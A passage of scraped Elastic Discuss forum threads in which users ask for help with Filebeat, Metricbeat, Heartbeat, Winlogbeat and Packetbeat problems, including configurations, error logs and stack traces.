    "url": "https://discuss.elastic.co/t/filebeat-not-shipping-exceptions-and-error-message-logs-from-my-log-file/228016",
    "title": "Filebeat not shipping Exceptions and Error message logs from my log file?",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Pacha_Gopi",
    "date": "April 15, 2020, 2:36am April 22, 2020, 1:54pm",
    "body": "Hi i am using filebeat for shipping my logs to logstash,problem that i am facing is filebeat not sending the Exception and Error message from my log file can anyone help me on this my log file logs are mentioned below [2020-04-15 00:30:04] local.ERROR: Error creating resource: [message] fopen(https://usvc.my-pathshala.com/api/sso/validate): failed to open stream: Connection refused [file] /var/www/stream.my-pathshala.com/releases/5/vendor/guzzlehttp/guzzle/src/Handler/StreamHandler.php [line] 323 {\"exception\":\"[object] (GuzzleHttp\\Exception\\ConnectException(code: 0): Error creating resource: [message] fopen(https://usvc.my-pathshala.com/api/sso/validate): failed to open stream: Connection refused [file] /var/www/stream.my-pathshala.com/releases/5/vendor/guzzlehttp/guzzle/src/Handler/StreamHandler.php [line] 323 at /var/www/stream.my-pathshala.com/releases/5/vendor/guzzlehttp/guzzle/src/Handler/StreamHandler.php:65) [stacktrace] #0 /var/www/stream.my-pathshala.com/releases/5/vendor/guzzlehttp/guzzle/src/PrepareBodyMiddleware.php(37): GuzzleHttp\\Handler\\StreamHandler->__invoke() #1 /var/www/stream.my-pathshala.com/releases/5/vendor/guzzlehttp/guzzle/src/Middleware.php(29): GuzzleHttp\\PrepareBodyMiddleware->__invoke() #2 /var/www/stream.my-pathshala.com/releases/5/vendor/guzzlehttp/guzzle/src/RedirectMiddleware.php(70): GuzzleHttp\\Middleware::GuzzleHttp\\{closure}() #3 /var/www/stream.my-pathshala.com/releases/5/vendor/guzzlehttp/guzzle/src/Middleware.php(59): GuzzleHttp\\RedirectMiddleware->__invoke() #4 /var/www/stream.my-pathshala.com/releases/5/vendor/guzzlehttp/guzzle/src/HandlerStack.php(71): GuzzleHttp\\Middleware::GuzzleHttp\\{closure}() #5 /var/www/stream.my-pathshala.com/releases/5/vendor/guzzlehttp/guzzle/src/Client.php(361): GuzzleHttp\\HandlerStack->__invoke() #6 /var/www/stream.my-pathshala.com/releases/5/vendor/guzzlehttp/guzzle/src/Client.php(163): GuzzleHttp\\Client->transfer() #7 /var/www/stream.my-pathshala.com/releases/5/vendor/guzzlehttp/guzzle/src/Client.php(183): GuzzleHttp\\Client->requestAsync() #8 /var/www/stream.my-pathshala.com/releases/5/vendor/guzzlehttp/guzzle/src/Client.php(96): GuzzleHttp\\Client->request() #9 /var/www/stream.my-pathshala.com/releases/5/app/Http/Middleware/PassportValidate.php(49): GuzzleHttp\\Client->__call() #10 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): App\\Http\\Middleware\\PassportValidate->handle() #11 /var/www/stream.my-pathshala.com/releases/5/vendor/fruitcake/laravel-cors/src/HandleCors.php(50): Illuminate\\Pipeline\\Pipeline->Illuminate\\Pipeline\\{closure}() #12 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Fruitcake\\Cors\\HandleCors->handle() #13 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Routing/Middleware/SubstituteBindings.php(41): Illuminate\\Pipeline\\Pipeline->Illuminate\\Pipeline\\{closure}() #14 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\\Routing\\Middleware\\SubstituteBindings->handle() #15 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Routing/Middleware/ThrottleRequests.php(59): Illuminate\\Pipeline\\Pipeline->Illuminate\\Pipeline\\{closure}() #16 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\\Routing\\Middleware\\ThrottleRequests->handle() #17 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\Pipeline\\Pipeline->Illuminate\\Pipeline\\{closure}() #18 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Routing/Router.php(687): Illuminate\\Pipeline\\Pipeline->then() #19 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Routing/Router.php(662): Illuminate\\Routing\\Router->runRouteWithinStack() #20 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Routing/Router.php(628): Illuminate\\Routing\\Router->runRoute() #21 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Routing/Router.php(617): Illuminate\\Routing\\Router->dispatchToRoute() #22 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(165): Illuminate\\Routing\\Router->dispatch() #23 /var/www/stream.my-pathshala.com/releases/5/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(128): Illuminate\\Foundation\\Http\\Kernel->Illuminate\\Foundation\\Http\\{closure}()",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b695ee97-9073-459c-9ee2-a088f88243c0",
    "url": "https://discuss.elastic.co/t/system-process-informamtion-logged-wrong/228676",
    "title": "System process informamtion logged wrong?",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "suikast42",
    "date": "April 18, 2020, 8:00pm April 22, 2020, 1:45pm",
    "body": "The docu says that process name is exported under the field system.process.name But in the metricbeat index it under process.name image1440×793 80.8 KB I am running on V 7.6.2",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "0289711d-b2dd-4ebe-8301-b9ddcb7f908e",
    "url": "https://discuss.elastic.co/t/jolokia-module-exec-operation/229139",
    "title": "Jolokia Module Exec Operation",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "jason_0",
    "date": "April 21, 2020, 10:49pm April 22, 2020, 1:15pm",
    "body": "Hi Team, Our developers are using Jolokia to perform various actions. One of which is an exec operation that returns some application telemetry we want to ingest into elasticsearch via metricbeat Jolokia module. The URL path when doing this call via the browser is host:port/jolokia/exec/bean:name=buildinfo/getAppInfo From what I can gather after looking at the code on GitHub, it looks like the operation type is hardcoded to read, here - https://github.com/elastic/beats/blob/3b994389d6ce8968141a18e539efc6e5ba462f0d/metricbeat/module/jolokia/jmx/config.go#L448 Is it possible to make this configurable such that we could retrieve the response data or is my best path forward to use the HTTP module?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "47a72026-6f83-42c7-94e3-b92388c64083",
    "url": "https://discuss.elastic.co/t/failed-to-list-v1beta1-replicaset/229179",
    "title": "Failed to list *v1beta1.ReplicaSet",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "rajputvishwas",
    "date": "April 22, 2020, 12:38pm",
    "body": "I have setup metricbeat-7.5.2 on kubernetes using the instructions available @ kauri. my pod is up and running fine and I am also able to view metrics in kibana. When I was going through the pod logs I found an error, which states \"cannot list resource \"replicasets\" in API group \"apps\" at the cluster scope\". E0422 05:26:29.053587 1 reflector.go:125] github.com/elastic/beats/libbeat/common/kubernetes/watcher.go:235: Failed to list *v1beta1.ReplicaSet: replicasets.apps is forbidden: User \"system:serviceaccount:logging:metricbeat\" cannot list resource \"replicasets\" in API group \"apps\" at the cluster scope",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c166a0dd-3bbc-4b27-9db2-8aa861f31d83",
    "url": "https://discuss.elastic.co/t/creating-a-beat-based-on-metric-beat/229253",
    "title": "Creating a beat based on metric beat",
    "category": [
      "Beats"
    ],
    "author": "nabeel_ahmed",
    "date": "April 22, 2020, 12:05pm",
    "body": "Hi, i am creating a beat based on metric and follow this documentation https://www.elastic.co/guide/en/beats/devguide/current/creating-beat-from-metricbeat.html But it gave me Kibana dashboards error: vendor/github.com/elastic/beats/v7/metricbeat/Makefile:82: warning: overriding recipe for target 'integration-tests' vendor/github.com/elastic/beats/v7/libbeat/scripts/Makefile:216: warning: ignoring old recipe for target 'integration-tests' Generated fields.yml for vpn_beat to /home/nabeel/go/src/github.com/nabeel-shakeel/vpn_beat/fields.yml Generated fields.yml for vpn_beat to /home/nabeel/go/src/github.com/nabeel-shakeel/vpn_beat/build/fields/fields.all.yml Unknown target specified: dashboards make: *** [kibana] Error 2 Error: running \"make update\" failed with exit code 2 How to get rid of this error ?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "35140ccb-1074-44ea-b29b-0e3b2bdc2b5b",
    "url": "https://discuss.elastic.co/t/filebeat-refuse-connect-to-logstash-port-connection-timed-out-error/228803",
    "title": "Filebeat refuse connect to Logstash port- \"Connection timed out error\"",
    "category": [
      "Beats"
    ],
    "author": "pash123",
    "date": "April 20, 2020, 8:07am April 20, 2020, 6:59pm April 20, 2020, 11:05pm April 21, 2020, 12:04am April 21, 2020, 11:05am April 21, 2020, 11:31am April 22, 2020, 9:38am",
    "body": "Hi all, I have installed FB on Linux server and LG on my local server. (ES and Kibana installed on local server as well) **LG configuration:** input{ beats{ port => 5044 } } output { elasticsearch { hosts => [\"http://localhost:9200\"] index => \"%{[@metadata][beat]}-%{[@metadata][version]}\" } } **FB configuration:** filebeat.inputs: - type: log enabled: true paths: - /opt/tomcat/logs/catalina.out output.logstash: hosts: [\"192.168.220.33:5044\"] **More details:** I'm connecting to the FB server from my pc which working with VPN the VPN's ip- 192.168.220.33 (as written in FB config). The LG working fine, i check configuration for LG and it's OK, and seems that it's listening to port 5044. However than trying to check connection on FB: \"telnet 192.168.220.33 5044\" I get: \"try to connect\" and after few seconds \"Connection timed out error\". I check some tutorials on this site so i try as well, this what i got: * I turn off Firewall for public and social connection, not working. * try to run FB- \"sudo chown root filebeat.yml => sudo ./filebeat -e\"- ERROR pipeline/output.go:100 Failed to connect to backoff(async(tcp://192.168.220.33:5044)): dial tcp 192.168.220.33:5044: i/o timeout * ping 192.168.220.33 -\"PING 192.168.220.33 (192.168.220.33) 56(84) bytes of data\".",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "daaa0827-6005-4ac7-b4c7-8411604d9590",
    "url": "https://discuss.elastic.co/t/why-is-filebeat-reading-log-files-over-and-over-again/224654",
    "title": "Why is filebeat reading log files over and over again",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "SjonnieW",
    "date": "March 23, 2020, 11:06am March 23, 2020, 11:30am March 23, 2020, 1:15pm March 26, 2020, 4:20pm April 21, 2020, 1:40pm April 21, 2020, 3:25pm April 22, 2020, 6:37am",
    "body": "Hello all I know this was posted before, only i never read a satifying answer\\solution. I was advised by my user succes manager to post the problem here Using a windows10 environment (also tried on Linux) I am using a simple configuration to read a log file with logbeat. To start logstash i use the command .\\bin\\logstash -f .\\config\\sample.conf Sample.conf: input { beats { port => 5044 } } filter { grok { match => [ \"message\", \"%{TIMESTAMP_ISO8601:timestamp_string} %{SPACE}%{GREEDYDATA:line}\" ] } mutate { remove_field => [message, timestamp_string] } } output { elasticsearch { hosts => [\"http://localhost:9200\"] } stdout { codec => rubydebug } } I start filebeat with the command .\\filebeat Filebeat.yml: filebeat.inputs: type: log enabled: true paths: ./sample.log output.logstash: hosts: [\"localhost:5044\"] Sample.log contains 14 records What happenes is that the log file is being read and send over and over again wich will give a lot of duplicates. I found a way to avoid duplicates with the use of a fingerprint but that is not what i want. I want the logfile only being updated by filebeat when a change happenes in the file and not being read all over again. Also tried ignore_older: 5s, but it gave the same results. In the registry file data.json offset is constantly set to 0 question: Why are basic functions of filebeat not working (what am i missing) ?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "64f1c587-c0f6-4252-8eaf-3f630ebccf3e",
    "url": "https://discuss.elastic.co/t/winlogbeat-data-is-not-parsing-properly/228820",
    "title": "Winlogbeat data is not parsing properly",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "sundar_elk",
    "date": "April 20, 2020, 9:01am April 21, 2020, 12:39pm April 21, 2020, 12:39pm April 22, 2020, 1:12am April 22, 2020, 4:50am",
    "body": "Hi Team, I'm using winlogbeat for pushing all windows events to elasticsearch. Parsing is not happening properly. One of the examples is under “Message” there is “Properties” which when parsed in winlog.event_data.Properties does not show up correctly Actual message :-1 message1152×648 13.1 KB parsed field :-1 parsed_event1152×648 26.8 KB It should come read property but coming some number %%7684 Is it bug? Thanks Sundar",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "e23a1ee5-ec79-4ca8-abb8-031ae735286e",
    "url": "https://discuss.elastic.co/t/elasticsearch-functionbeat-cloudwatch-receiving-failed-to-connect-to-backoff-elastisearch-http-locahost-9200-error/229127",
    "title": "ElasticSearch + Functionbeat + CloudWatch, receiving Failed to connect to backoff (elastisearch(http://locahost:9200)) error",
    "category": [
      "Beats",
      "Functionbeat"
    ],
    "author": "syost",
    "date": "April 22, 2020, 2:33am",
    "body": "(topic withdrawn by author, will be automatically deleted in 24 hours unless flagged)",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "a09ce13f-5fb4-4cc8-8e63-e52ad5b1b414",
    "url": "https://discuss.elastic.co/t/having-troubles-installing-heartbeat-on-aks/228216",
    "title": "Having troubles installing Heartbeat on AKS",
    "category": [
      "Beats",
      "Heartbeat"
    ],
    "author": "nfsouzaj",
    "date": "April 15, 2020, 10:38pm April 16, 2020, 12:46pm April 16, 2020, 2:00pm April 22, 2020, 1:22am",
    "body": "Hello, I've been trying pretty hard to install heartbeat but so far aint working. All our Elasticsearch stack is being installed through helm charts successfully. Apparently heartbeat doesn't have an official helm chart yet (am I wrong?). I did find a heartbeat helm chart which seems not to belong to elasticsearch team https://github.com/helm/charts/tree/master/stable/heartbeat but as much as I try to install it it just doesn't work as expected. It seems that the installation happens but the configurations I added into my heartbeat.values.yml aren't taken into consideration (index names, hosts to be monitored...). Whenever I connect in the underlying AKS layer into the container with kubectl exec and I check the heartbeat.yml file it seems standard without the configurations I have provided so I am here wondering: Which one is the right way to install heartbeat into my AKS?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "08ccf58f-f60f-4417-8b68-9bf29c6622ab",
    "url": "https://discuss.elastic.co/t/heartbeat-when-reload-enabled-true/227619",
    "title": "Heartbeat when reload.enabled: true",
    "category": [
      "Beats",
      "Heartbeat"
    ],
    "author": "fadjar340",
    "date": "April 11, 2020, 4:33pm April 14, 2020, 1:51am April 14, 2020, 2:46am April 16, 2020, 12:05pm April 16, 2020, 5:35pm April 22, 2020, 1:21am",
    "body": "Dear developers, Elasticsearch 7.6.2 I have issue in the heartbeat when reload.enabled change to true. The condition as follow: I have around 120 monitor yml file I created around 40 new monitor yml file Before the reload.enabled: true, the pipeline clients indicate the correct number Then, I thought if I make reload.enabled: true, I can add new monitor yml automatically read by heartbeat just copy the yml file to monitors.d folder The heartbeat log said there are new configuration as expected For several minutes, the pipeline client goes to more than 2000 and all metric of heartbeat going crazy I removed the new yml but the pipeline still high and higher restart the heartbeat and the pipeline client back to normal When I revert to false, there is no issue anymore regarding the increasing the pipeline clients. Regards, Fadjar Tandabawana",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "8ba995b4-fd09-477d-8463-cbc81fb273be",
    "url": "https://discuss.elastic.co/t/heartbeat-using-docker-hints/227768",
    "title": "Heartbeat using Docker hints",
    "category": [
      "Beats",
      "Heartbeat"
    ],
    "author": "nedim",
    "date": "April 13, 2020, 11:43am April 14, 2020, 1:50am April 14, 2020, 2:05am April 16, 2020, 5:26pm April 16, 2020, 8:22pm April 16, 2020, 11:21pm April 17, 2020, 2:58am April 22, 2020, 1:21am",
    "body": "I am trying to setup heartbeat using hints/labels and I am getting the following error ``` 2020-04-11T06:02:38.483Z WARN [hints.builder] hints/monitors.go:195 unable to frame a host from input host: %shost.my.domain.io ERROR [autodiscover] autodiscover/autodiscover.go:204 Auto discover config check failed for config '{ \"name\": \"Prom\", \"schedule\": \"@every 10s\", \"type\": \"http\" }', won't start runner: job err hosts is a mandatory parameter accessing config my docker-compose labels: # # heartbeat # co.elastic.monitor/1.name: \"Prom\" co.elastic.monitor/1.type: http co.elastic.monitor/1.hosts: ${PROM_HOST} co.elastic.monitor/1.schedule: '@every 10s' Heartbeat version 7.6.2",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "a43880d6-d1f0-4bbe-81e7-9d83e8eb7332",
    "url": "https://discuss.elastic.co/t/heartbeat-envio-de-alerta-de-uptime-por-email/226745",
    "title": "HeartBeat - Envio de alerta de UPTIME por email",
    "category": [
      "Beats",
      "Heartbeat"
    ],
    "author": "",
    "date": "April 6, 2020, 4:30pm April 22, 2020, 1:18am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "067d3983-d7bd-4fae-8ae3-666f3bd50441",
    "url": "https://discuss.elastic.co/t/metricbeats-dashboard-doesnt-show-the-centos-cpu-memory-info-and-network-traffic/228952",
    "title": "Metricbeat's dashboard doesn't show the CentOS cpu, memory info and network traffic",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Mudboyzh",
    "date": "April 21, 2020, 10:28pm",
    "body": "I used Metricbeat to collect servers system status, but I found something strange. There are two OSs in my servers. The Window Servers work fine, but the one of CentOS Servers seems to lost cpu, memory info and network traffic on Metricbeat's dashboard. These Metricbeats are using default setting, no custom index or dashboards. Elastic Stack and metricbeat version is 7.6.1. Here is the Metricbeat system overview dashboard. Window Server is cover with blue. CentOS is cover with yellow. 截圖 2020-04-21 上午10.42.401911×830 137 KB But the histogram at the bottom of the dashboard has cpu usage data. 截圖 2020-04-21 上午11.00.532344×770 107 KB This is the odd CentOS Server. CPU, memory, system load, swap usage and network traffic are zero. 截圖 2020-04-21 上午10.43.161534×840 139 KB Discover cpu data of the odd CentOS Server 截圖 2020-04-21 上午10.43.521902×835 133 KB Discover data of the odd CentOS Server CPU { \"_index\": \"metricbeat-7.6.1-2020.04.16-000002\", \"_type\": \"_doc\", \"_id\": \"1tmUmnEBkTqZfVRGJY97\", \"_version\": 1, \"_score\": null, \"_source\": { \"@timestamp\": \"2020-04-21T02:32:11.409Z\", \"ecs\": { \"version\": \"1.4.0\" }, \"event\": { \"dataset\": \"system.cpu\", \"module\": \"system\", \"duration\": 231523 }, \"metricset\": { \"period\": 10000, \"name\": \"cpu\" }, \"service\": { \"type\": \"system\" }, \"system\": { \"cpu\": { \"user\": { \"pct\": 0.3986 }, \"idle\": { \"pct\": 1.5008 }, \"total\": { \"pct\": 0.487 }, \"softirq\": { \"pct\": 0.0041 }, \"system\": { \"pct\": 0.0844 }, \"iowait\": { \"pct\": 0.0122 }, \"steal\": { \"pct\": 0 }, \"cores\": 2, \"irq\": { \"pct\": 0 }, \"nice\": { \"pct\": 0 } } }, \"host\": { \"id\": \"d171ddbb87e046a2929e0c2d99a06f70\", \"containerized\": false, \"name\": \"ha01\", \"hostname\": \"ha01\", \"architecture\": \"x86_64\", \"os\": { \"version\": \"7 (Core)\", \"family\": \"redhat\", \"name\": \"CentOS Linux\", \"kernel\": \"3.10.0-957.el7.x86_64\", \"codename\": \"Core\", \"platform\": \"centos\" } }, \"agent\": { \"id\": \"b83b8e05-868c-42d4-aaa3-a663f53117a7\", \"version\": \"7.6.1\", \"type\": \"metricbeat\", \"ephemeral_id\": \"e882e132-3c64-40ff-bca0-60c2b6b9fa86\", \"hostname\": \"ha01\" } }, \"fields\": { \"@timestamp\": [ \"2020-04-21T02:32:11.409Z\" ] }, \"highlight\": { \"metricset.name\": [ \"@kibana-highlighted-field@cpu@/kibana-highlighted-field@\" ], \"host.hostname\": [ \"@kibana-highlighted-field@ha01@/kibana-highlighted-field@\" ] }, \"sort\": [ 1587436331409 ] } And memory data { \"_index\": \"metricbeat-7.6.1-2020.04.16-000002\", \"_type\": \"_doc\", \"_id\": \"ptqfmnEBkTqZfVRG7lVy\", \"_version\": 1, \"_score\": null, \"_source\": { \"@timestamp\": \"2020-04-21T02:45:03.746Z\", \"service\": { \"type\": \"system\" }, \"system\": { \"memory\": { \"used\": { \"pct\": 0.9171, \"bytes\": 15276822528 }, \"free\": 1380626432, \"actual\": { \"free\": 7749062656, \"used\": { \"pct\": 0.5348, \"bytes\": 8908386304 } }, \"page_stats\": { \"pgfree\": { \"pages\": 3126828648 }, \"pgsteal_kswapd\": { \"pages\": 0 }, \"pgsteal_direct\": { \"pages\": 0 }, \"pgscan_kswapd\": { \"pages\": 0 }, \"pgscan_direct\": { \"pages\": 0 } }, \"swap\": { \"out\": { \"pages\": 23463 }, \"readahead\": { \"cached\": 0, \"pages\": 0 }, \"total\": 17179865088, \"used\": { \"bytes\": 9175040, \"pct\": 0.0005 }, \"free\": 17170690048, \"in\": { \"pages\": 3545 } }, \"hugepages\": { \"swap\": { \"out\": { \"fallback\": 0, \"pages\": 0 } }, \"total\": 0, \"used\": { \"bytes\": 0, \"pct\": 0 }, \"free\": 0, \"reserved\": 0, \"surplus\": 0, \"default_size\": 2097152 }, \"total\": 16657448960 } }, \"ecs\": { \"version\": \"1.4.0\" }, \"host\": { \"architecture\": \"x86_64\", \"os\": { \"family\": \"redhat\", \"name\": \"CentOS Linux\", \"kernel\": \"3.10.0-957.el7.x86_64\", \"codename\": \"Core\", \"platform\": \"centos\", \"version\": \"7 (Core)\" }, \"name\": \"ha01\", \"id\": \"d171ddbb87e046a2929e0c2d99a06f70\", \"containerized\": false, \"hostname\": \"ha01\" }, \"agent\": { \"hostname\": \"ha01\", \"id\": \"b83b8e05-868c-42d4-aaa3-a663f53117a7\", \"version\": \"7.6.1\", \"type\": \"metricbeat\", \"ephemeral_id\": \"e882e132-3c64-40ff-bca0-60c2b6b9fa86\" }, \"event\": { \"dataset\": \"system.memory\", \"module\": \"system\", \"duration\": 24432150 }, \"metricset\": { \"name\": \"memory\", \"period\": 10000 } }, \"fields\": { \"@timestamp\": [ \"2020-04-21T02:45:03.746Z\" ] }, \"highlight\": { \"metricset.name\": [ \"@kibana-highlighted-field@memory@/kibana-highlighted-field@\" ], \"host.hostname\": [ \"@kibana-highlighted-field@ha01@/kibana-highlighted-field@\" ] }, \"sort\": [ 1587437103746 ] } Here is the system.yml 截圖 2020-04-21 上午11.54.06651×601 30.7 KB Thanks.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "05c4a4e6-013d-4f9a-9d9f-f5f82b7663c5",
    "url": "https://discuss.elastic.co/t/aws-metricbeat-elb-not-working/229064",
    "title": "AWS metricbeat ELB not working",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "kmroz",
    "date": "April 21, 2020, 7:28pm April 21, 2020, 7:28pm",
    "body": "I am working on the latest version of Metricbeat. I have configured the AWS module to work in one of my AWS accounts. It seems there are a few issues with some of the dashboards. ELB dashboard doesn't generate data. While investigating , it seems the visualizations are not configured at all. AWS Service Filter on dashboard AWS usage overview doesnt work. It says it cant match query. I have a feeling it has to do with the field for the Service. Cloudwatch ECS CPU Available broke. visualization Cloudwatch ECS Memory Available broken visualization Any help on these would be great.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "55a88d3e-3f6c-4987-88bc-1f8c1426d62f",
    "url": "https://discuss.elastic.co/t/tracking-sql-queries/229055",
    "title": "Tracking SQL Queries",
    "category": [
      "Beats"
    ],
    "author": "",
    "date": "April 21, 2020, 1:34pm April 21, 2020, 7:02pm April 21, 2020, 7:24pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "73941769-4278-4f29-b39d-9e7d68262911",
    "url": "https://discuss.elastic.co/t/docker-logs-not-parsed/229075",
    "title": "Docker logs not parsed",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "April 21, 2020, 3:02pm April 21, 2020, 5:00pm April 21, 2020, 5:44pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "fe8ff13e-03de-4f8d-bc7f-a36719bb2c85",
    "url": "https://discuss.elastic.co/t/filebeat-registry-will-i-get-duplicates-if-i-delete/229060",
    "title": "Filebeat Registry - Will I get duplicates if I delete",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "stevesimpson",
    "date": "April 21, 2020, 1:49pm April 21, 2020, 5:13pm",
    "body": "Hi, I've been an idiot. I added a conditional into my Logstash pipelines which, long story short, has caused me to miss around an hour of logging data over about 18 different agents. I've since fixed the issue and data is now being indexed correctly. I've read that if I delete the filebeat registry this will cause Filebeat to re-send the log files. I have two concerns with this: Will this \"duplicate\" any events in Elasticsearchy that were indexed correctly? The if statement only broke certain modules so some log types were still indexed correctly. If I delete the registry would those files then be duplicated? Duplicated data is probably even worse than the missing data so that is not an option. Even though this was only an hour we're probably talking 100,000+ events missing. What is the right approach here to \"backfill\" this data? Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2fc233ba-f70a-4501-b475-db3664036c80",
    "url": "https://discuss.elastic.co/t/is-there-a-go-api-to-read-output-logstash-yml-settings-from-a-custom-libbeat/229072",
    "title": "Is there a Go API to read output.logstash yml settings from a custom libbeat",
    "category": [
      "Beats"
    ],
    "author": "rmauri",
    "date": "April 21, 2020, 3:05pm",
    "body": "I have a custom beat based on libbeat, that parses log files and adds fields and their value to the beat event to be output to logstash. The log files contain json that get unmarshaled by go and then translated from a go nested map to a dot delimited string key name and associated value. The problem is the application producing the log files containing the json text often is undisciplined in the key naming and value types. I have my custom beat performing an api request to elastic to read the index mapping and then performing a validation and key naming and type conversions so as to avoid downstream mapping conflicts. This works great, but the beat needs to know the index name before it processes any events. Currently, I have a custom config defined in the yml config file called IndexWildcard that must be kept in sync with the index name in the yml file output.logstash. I'd rather have my beat just read the index name at startup and not have this additional indexWildacrd setting. Is there a go api for a libbeat to read the yml content and specifically the output.logstash index setting? Also, I have a custom processor that I plug into a custom winlogbeat that needs a similar access to yml settings. I hope there is a generalized api I can use for both types of beats.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4a8ad808-73f6-4cfc-beee-cda815da3d6a",
    "url": "https://discuss.elastic.co/t/amqp-dump-writes-incorrect-body/229067",
    "title": "AMQP dump writes incorrect body",
    "category": [
      "Beats",
      "Packetbeat"
    ],
    "author": "_yumi",
    "date": "April 21, 2020, 2:22pm",
    "body": "Hello! I'm using packetbeat to capture AMQP traffic with send_response option enabled. Messages are in JSON. Sometimes it shows me valid JSON that was expected, but sometimes response looks like list of a numbers (I'll show below). Rabbit server, exchange, queue and everything is absolutely the same every time. And also there's application that reads AMQP messages. Inside of it these messages with numbers are handled correctly, so the only problem is - they are dumped wrong... response 123 13 10 34 112 97 121 68 97 116 101 34 58 34 50 48 50 48 45 48 52 45 50 48 84 48 Could you please give me some suggestions what could I do in that case?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "7995fff9-6d77-49c0-8a26-8530870dc1b9",
    "url": "https://discuss.elastic.co/t/filebeats-7-6-2-duplicates-logs-entries-on-idle-minikube-instance/229063",
    "title": "Filebeats(7.6.2) duplicates logs entries on idle minikube instance",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "nickytd",
    "date": "April 21, 2020, 1:56pm",
    "body": "Hi here is a helm chart that installs filebeat, journalbeat, kibana and ES instance on a minikube. Upon start the log entries are seen to be duplicated by the Filebeat Same origin (file path and offset) Screenshot 2020-04-21 at 15.54.501412×140 13.2 KB Can you please double check and confirm?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "25b56ec8-7f7f-483a-aba4-b7a753551d82",
    "url": "https://discuss.elastic.co/t/filebeat-7-6-2-crashes-on-fingerprint/228805",
    "title": "Filebeat (7.6.2) crashes on fingerprint",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "nickytd",
    "date": "April 20, 2020, 8:16am April 20, 2020, 3:14pm April 21, 2020, 1:49pm",
    "body": "filebeat crashes when adding fingerprint Can you please take a look and confirm? Thanks. Here is the stack trace: ... panic: d.nx != 0 goroutine 113 [running]: crypto/sha256.(*digest).checkSum(0xc000c0f950, 0x0, 0x0, 0x0, 0x0) /usr/local/go/src/crypto/sha256/sha256.go:234 +0x1d9 crypto/sha256.(*digest).Sum(0xc0000c6000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0) /usr/local/go/src/crypto/sha256/sha256.go:210 +0x69 github.com/elastic/beats/libbeat/processors/fingerprint.(*fingerprint).Run(0xc00012e070, 0xc0000d0300, 0xc0000d0300, 0x0, 0x0) /go/src/github.com/elastic/beats/libbeat/processors/fingerprint/fingerprint.go:73 +0xd1 github.com/elastic/beats/libbeat/publisher/processing.(*group).Run(0xc0006c0450, 0xc0000d0300, 0xc0000d0300, 0x0, 0x0) /go/src/github.com/elastic/beats/libbeat/publisher/processing/processors.go:104 +0x94 github.com/elastic/beats/libbeat/publisher/processing.(*group).Run(0xc000781d70, 0xc0000d0300, 0xed62f4f4d, 0x0, 0xc000753ce0) /go/src/github.com/elastic/beats/libbeat/publisher/processing/processors.go:104 +0x94 github.com/elastic/beats/libbeat/publisher/pipeline.(*client).publish(0xc00070bc00, 0x391f483f, 0xed62f4f4d, 0x0, 0x0, 0xc000753f80, 0x31fb340, 0xc0004f3440, 0x0) /go/src/github.com/elastic/beats/libbeat/publisher/pipeline/client.go:89 +0x571 github.com/elastic/beats/libbeat/publisher/pipeline.(*client).Publish(0xc00070bc00, 0x391f483f, 0xed62f4f4d, 0x0, 0x0, 0xc000753f80, 0x31fb340, 0xc0004f3440, 0x0) /go/src/github.com/elastic/beats/libbeat/publisher/pipeline/client.go:68 +0xc2 github.com/elastic/beats/filebeat/channel.(*outlet).OnEvent(0xc000781e60, 0x391f483f, 0xed62f4f4d, 0x0, 0x0, 0xc000753f80, 0x31fb340, 0xc0004f3440, 0x0, 0x1) 